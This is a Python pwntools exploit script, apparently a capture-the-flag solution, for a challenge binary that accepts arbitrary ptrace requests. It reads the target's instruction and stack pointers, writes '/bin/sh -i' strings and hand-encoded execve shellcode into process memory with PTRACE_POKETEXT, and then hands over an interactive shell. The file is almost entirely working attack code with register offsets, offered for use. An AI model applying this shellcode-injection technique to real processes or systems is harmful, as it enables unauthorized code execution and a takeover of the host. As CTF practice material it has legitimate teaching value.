#!/usr/bin/env python3
import time

from pwn import *

# /* Write the word DATA into the process's text space at address ADDR.  */
PTRACE_POKETEXT = b'0x04'

# Copy the tracee's general-purpose or floating-point
# registers, respectively, to the address data in the
# tracer.
PTRACE_PEEKUSER = b'0x03'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
#io = remote(HOST, int(PORT))
io = process("./challenge")

# requests to inspect and modify the tracee.
def sendPtraceRequest(req:bytes):
        # local_30 = read_int("What ptrace request do you want to send?");
        # req - 8 bytes of hex  data
        io.recvuntil("?")
        io.sendline(req)

def sendAddress(addr:bytes):
        # local_28 = read_int("What address do you want?");
        # addr - 8 bytes of hex  data 
        io.recvuntil("?")
        io.sendline(addr)

def sendCopyData(data:bytes):
        # local_20 = read_int("What do you want copied into data?");
        # data = 8 bytes of hex  data
        io.recvuntil("?")
        io.sendline(data)


def sendPtrace(req:bytes, addr:bytes, data:bytes):
        sendPtraceRequest(req)
        sendAddress(addr)
        sendCopyData(data)

def pTraceAgain(again:bytes):
        # sentinal = read_int("Do another (0/1)?");
        # again - 0x00=false or 0x01=true
        io.recvuntil("(0/1)?")
        io.sendline(again)

def getRegAddr(offset:bytes):
        pt_req = PTRACE_PEEKUSER
        addr = offset # ip reg offset 
        data = b'0x00' # ignored with PTRACE_PEEKUSER 
        sendPtrace(pt_req, addr, data)
        io.recvuntil(b'returned ')
        rip = io.recvn(14)
        return rip


def calcAddr(offset:int, org_addr:bytes):
        int_val = int(org_addr, 16)
        ret_val = bytes(hex((int_val + offset)), "utf-8")
        return ret_val

RSP_OFFSET = b'0x98'
RIP_OFFSET = b'0x80'

context.log_level = "debug"
rip_addr = getRegAddr(RIP_OFFSET)

pTraceAgain(b'0x01')
rsp_addr = getRegAddr(RSP_OFFSET)

bin_addr = calcAddr(8, rsp_addr)
null_addr = calcAddr(16, rsp_addr)
sh_inter = calcAddr(24, rsp_addr)



shell_code_1 = b'0x4808c78348e78948'
shell_code_2 = b'0xb800000000bafe89'
shell_code_3 = b'0x18c683480000003b'
shell_code_4 = b'0x0000000000c3050f'


shell_code_1_addr = rip_addr
shell_code_2_addr = calcAddr(8, rip_addr)
shell_code_3_addr = calcAddr(16, rip_addr)
shell_code_4_addr = calcAddr(24, rip_addr)


null_2 = calcAddr(-8, rip_addr)



pTraceAgain(b'0x01')
sendPtrace(PTRACE_POKETEXT, bin_addr, b'0x0068732f6e69622f')

pTraceAgain(b'0x01')
sendPtrace(PTRACE_POKETEXT, null_addr, b'0x0000000000000000')

pTraceAgain(b'0x01')
sendPtrace(PTRACE_POKETEXT, sh_inter, b'0x000000692d206873')

pTraceAgain(b'0x01')
sendPtrace(PTRACE_POKETEXT, null_2, b'0x0000000000000000')

pTraceAgain(b'0x01')
sendPtrace(PTRACE_POKETEXT, shell_code_1_addr, shell_code_1)

pTraceAgain(b'0x01')
sendPtrace(PTRACE_POKETEXT, shell_code_2_addr, shell_code_2)

pTraceAgain(b'0x01')
sendPtrace(PTRACE_POKETEXT, shell_code_3_addr, shell_code_3)

pTraceAgain(b'0x01')
sendPtrace(PTRACE_POKETEXT, shell_code_4_addr, shell_code_4)



io.interactive()

'''
struct user_regs_struct {
        unsigned long   r15;            0x00
        unsigned long   r14;            0x08
        unsigned long   r13;            0x10
        unsigned long   r12;            0x18
        unsigned long   bp;             0x20
        unsigned long   bx;             0x28
        unsigned long   r11;            0x30
        unsigned long   r10;            0x38
        unsigned long   r9;             0x40
        unsigned long   r8;             0x48
        unsigned long   ax;             0x50
        unsigned long   cx;             0x58
        unsigned long   dx;             0x60
        unsigned long   si;             0x68
        unsigned long   di;             0x70
        unsigned long   orig_ax;        0x78
        unsigned long   ip;             0x80
        unsigned long   cs;             0x88
        unsigned long   flags;          0x90
        unsigned long   sp;             0x98
        unsigned long   ss;             0xA0
        unsigned long   fs_base;        0xA8
        unsigned long   gs_base;        0xB0
        unsigned long   ds;             0xB8
        unsigned long   es;             0xC0
        unsigned long   fs;             0xC8
        unsigned long   gs;             0xD0
};
'''
